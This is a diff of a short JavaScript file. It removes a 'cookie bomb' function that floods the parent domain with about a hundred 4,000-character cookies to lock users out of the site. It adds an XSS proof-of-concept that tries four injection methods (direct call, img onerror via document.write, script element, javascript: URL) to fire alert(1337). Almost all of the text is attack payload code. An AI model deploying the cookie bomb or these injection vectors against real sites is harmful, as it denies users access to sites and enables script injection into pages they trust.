@@ -1,20 +1,20 @@
-function cookieBomb() {
-    // Get the current domain and its parent domain
-    const domain = document.domain.split('.').splice(-2).join('.');
+// Try multiple execution methods
+(function(){
+    try {
+        alert(1337);
+    } catch(e) {}
     
-    // Create a large string to fill the cookies
-    const pollution = 'a'.repeat(4000); // 4000 characters
+    try {
+        document.write('<img src=x onerror=alert(1337)>');
+    } catch(e) {}
     
-    // Create multiple cookies to flood the browser
-    for (let i = 1; i < 100; i++) {
-        document.cookie = `bomb${i}=${pollution}; domain=${domain}; path=/`;
-    }
+    try {
+        var s = document.createElement('script');
+        s.innerHTML = 'alert(1337)';
+        document.body.appendChild(s);
+    } catch(e) {}
     
-    // Notify the user when the bomb is complete
-    setTimeout(() => {
-        alert(`Cookie bomb complete! You can no longer access ${domain} in this browser.`);
-    }, 1000);
-}
-
-// Call the function to execute the cookie bomb
-cookieBomb();
+    try {
+        location.href = 'javascript:alert(1337)';
+    } catch(e) {}
+})();
